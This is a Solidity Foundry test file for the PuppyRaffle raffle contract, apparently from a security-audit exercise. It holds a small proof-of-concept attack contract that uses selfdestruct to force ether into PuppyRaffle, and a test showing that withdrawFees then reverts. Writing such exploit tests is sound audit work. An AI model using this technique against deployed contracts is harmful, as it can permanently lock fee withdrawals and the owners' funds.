// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";

contract BreakWithdrawFeesFunction {
    address vulnerableAddress;

    constructor(address _vulnerableAddress) {
        vulnerableAddress = _vulnerableAddress;
    }

    function attack() public payable {
        address payable addr = payable(vulnerableAddress);
        selfdestruct(addr);
    }
}

contract PuppyRaffleTest is StdInvariant, Test {
    PuppyRaffle puppyRaffle;
    BreakWithdrawFeesFunction breakWithdrawFeesFunction;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        breakWithdrawFeesFunction = new BreakWithdrawFeesFunction(
            address(puppyRaffle)
        );
    }

    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testAttack() public playersEntered {
        address ATTACKER = address(breakWithdrawFeesFunction);
        vm.deal(ATTACKER, 2 ether);
        breakWithdrawFeesFunction.attack();

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
